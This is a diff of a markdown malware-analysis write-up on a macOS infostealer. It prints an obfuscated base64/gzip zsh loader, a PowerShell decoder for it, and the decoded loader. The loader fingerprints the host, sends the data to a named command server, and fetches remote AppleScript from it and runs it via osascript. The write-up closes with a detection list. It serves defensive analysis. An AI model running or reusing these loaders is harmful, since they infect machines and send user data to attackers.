@@ -57,9 +57,9 @@ Technical write-up and extracted code for a macOS infostealer that combines cred
 ```powershell
 $b64='H4sIAD9mwWkC/71U4U7jRhD+b6nvMLeXXoiE7QRIUbmCytH0SAkJalKK1FbWxh7H22x2fbtrSLi7qg/RJ+yTdNfGEJIKqX/qXzvj/WZn5vtmXr8Kp0yE9zrzXsN3OC1mwCVNUMHff/4FCRqMDZz1x0BFAlMu4zncMZOBQY4LNGrl9ceR/X9MUso1Eo+lFpXSghsNCmkCf4QDNlVUrcIrhSkqFDHqMJaLgOY5x+C8P5GST+UyyDnTBk6dtyfolGPSF3lhxrJQFgJ7J2GCt6EoOIdPMFOYg/+BgSq0ZlS8BZOh8MB+dUZGFTahlHllaWUltgDKEZhIZVmgpoIZdo+QSgU/jEdDbzA6Ox30ov7w+9FxY+d/LIUBucDVVFKVDOhKFgaGdIHE/s/c237XnoyC5q+iCc3dZmX5CTTJ05k07f1PgHEmgRRiLuSdIC3vfDSeDE8ve7agTGojbNyNFNZCbcNH4+i696MF67voFpUGP1cyKWJzbQ0mxfNY2/jezSTqX1l8XCgOvsX7C7r0DbNpdCEzJtdHYUhzFrCcpatAqtlmyBeRLKYio/csDywV/w2ZxlKkbBZsNuSFIqofjcomT73zvoBmy0ntXcF4UorJyitFvoJCMzGDXDFhUk+jSKLETVqEtyjMTgs+lrIttQm968kxaXTImsuFsg9XeGh+JCWOHJEvNdklU/dclFGd1R6WP550FDNdW5X4a6tWQm1LXZJr+aw8n5uuyusJAULW6iWNarzcaW1WnFnLzJ0rzdi+uTIeObiBK3sHSN3/lGqTMo4Cl8aR50QQlr0JqxrBPwdyJoWxhj9Z5XgEbtQs48YmGv6ubbal8BuuSeQ5y2uE7p286XifHTv9tFxn5fBbJsD2Jyr3GiZQvlluOlwy41bZL2v1HkO1UeC3tV2zySaQtYBkKwUHcbGh/bCXhtI8z6favpHCDwVqUyflbb+zeXHrMXjjeQnFhRRRWojYNexRa7jEGL55vP/kO/kX396Gs6JzvjFV++2SrJ80Kv90ZlM8gkt5zzinYTdow84lja1+pc7eQt/yycE6YDSGG+i0o043OmxV+/JnnF4wE3b3D4P9r2Dn4nxyOdgFzuYI7zGeyxacZUouMPy6E7SDg4PDvaDTOYAxTaliDzDygsQqeeV05RpYLW4dK5YbN8tS08qwYtnonVXCt8T29IG+fwBqLQ9wOQcAAA==';$bytes=[Convert]::FromBase64String($b64);$ms=New-Object IO.MemoryStream(,$bytes);$gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);$out=$sr.ReadToEnd();$desktop=[Environment]::GetFolderPath('Desktop');$outFile=Join-Path $desktop 'Result.txt';[IO.File]::WriteAllText($outFile,$out);Write-Host '[+] Decoded to ' $outFile
 ```
-```
 ### Original zsh loader
-``bash
+
+`````bash
 #!/bin/zsh
 d6186d5=$(base64 -D <<'PAYLOAD_84c66a58' | gunzip
 H4sIAD9mwWkC/71U4U7jRhD+b6nvMLeXXoiE7QRIUbmCytH0SAkJalKK1FbWxh7H22x2fbtrSLi7qg/RJ+yTdNfGEJIKqX/qXzvj/WZn5vtmXr8Kp0yE9zrzXsN3OC1mwCVNUMHff/4FCRqMDZz1x0BFAlMu4zncMZOBQY4LNGrl9ceR/X9MUso1Eo+lFpXSghsNCmkCf4QDNlVUrcIrhSkqFDHqMJaLgOY5x+C8P5GST+UyyDnTBk6dtyfolGPSF3lhxrJQFgJ7J2GCt6EoOIdPMFOYg/+BgSq0ZlS8BZOh8MB+dUZGFTahlHllaWUltgDKEZhIZVmgpoIZdo+QSgU/jEdDbzA6Ox30ov7w+9FxY+d/LIUBucDVVFKVDOhKFgaGdIHE/s/c237XnoyC5q+iCc3dZmX5CTTJ05k07f1PgHEmgRRiLuSdIC3vfDSeDE8ve7agTGojbNyNFNZCbcNH4+i696MF67voFpUGP1cyKWJzbQ0mxfNY2/jezSTqX1l8XCgOvsX7C7r0DbNpdCEzJtdHYUhzFrCcpatAqtlmyBeRLKYio/csDywV/w2ZxlKkbBZsNuSFIqofjcomT73zvoBmy0ntXcF4UorJyitFvoJCMzGDXDFhUk+jSKLETVqEtyjMTgs+lrIttQm968kxaXTImsuFsg9XeGh+JCWOHJEvNdklU/dclFGd1R6WP550FDNdW5X4a6tWQm1LXZJr+aw8n5uuyusJAULW6iWNarzcaW1WnFnLzJ0rzdi+uTIeObiBK3sHSN3/lGqTMo4Cl8aR50QQlr0JqxrBPwdyJoWxhj9Z5XgEbtQs48YmGv6ubbal8BuuSeQ5y2uE7p286XifHTv9tFxn5fBbJsD2Jyr3GiZQvlluOlwy41bZL2v1HkO1UeC3tV2zySaQtYBkKwUHcbGh/bCXhtI8z6favpHCDwVqUyflbb+zeXHrMXjjeQnFhRRRWojYNexRa7jEGL55vP/kO/kX396Gs6JzvjFV++2SrJ80Kv90ZlM8gkt5zzinYTdow84lja1+pc7eQt/yycE6YDSGG+i0o043OmxV+/JnnF4wE3b3D4P9r2Dn4nxyOdgFzuYI7zGeyxacZUouMPy6E7SDg4PDvaDTOYAxTaliDzDygsQqeeV05RpYLW4dK5YbN8tS08qwYtnonVXCt8T29IG+fwBqLQ9wOQcAAA==
@@ -67,15 +67,15 @@ PAYLOAD_84c66a58
 )
 eval "$d6186d5"
 ```
-```
-
 ### Decoded loader
+
+```
 #!/bin/zsh # Debug loader — detect CIS and block with telemetry IS_CIS="false" if defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -qi russian; then IS_CIS="true" fi # Detect locale info — sanitize for JSON LOCALE_INFO=$(defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -i "KeyboardLayout Name" | head -5 | tr '\n' ',' | tr -d '"' | tr -d "'" || echo "unknown") HOSTNAME=$(hostname 2>/dev/null | tr -d '"' || echo "unknown") OS_VER=$(sw_vers -productVersion 2>/dev/null || echo "unknown") EXT_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://icanhazip.com 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "unknown") EXT_IP=$(echo "$EXT_IP" | tr -d ' ') # Build JSON safely using printf send_debug_event() { local EVT="$1" local JSON=$(printf '{"event":"%s","build_hash":"%s","ip":"%s","is_cis":"%s","locale":"%s","hostname":"%s","os_version":"%s"}' "$EVT" "" "$EXT_IP" "$IS_CIS" "$LOCALE_INFO" "$HOSTNAME" "$OS_VER") curl -s -X POST "https://fastfilenext.com/api/debug/event" -H "Content-Type: application/json" -d "$JSON" --max-time 5 >/dev/null 2>&1 } # If CIS — send cis_blocked event and exit if [ "$IS_CIS" = "true" ]; then send_debug_event "cis_blocked" >/dev/null 2>&1 exit 0 fi # Not CIS — send loader_requested event send_debug_event "loader_requested" >/dev/null 2>&1 & daemon_function() { exec </dev/null exec >/dev/null exec 2>/dev/null curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "https://fastfilenext.com/debug/payload.applescript" | osascript } daemon_function "$@" & exit 0
 
 ```
-```
 ### Payload.applescript
 
+```
 try
 do shell script "killall Terminal"
 end try
@@ -216,7 +216,7 @@ end try
 end checkvalid
 Full code is attached in repo
 ```
-```
+
 ## Detection opportunities
 
 - Creation of `~/Library/LaunchAgents/com.google.keystone.agent.plist`
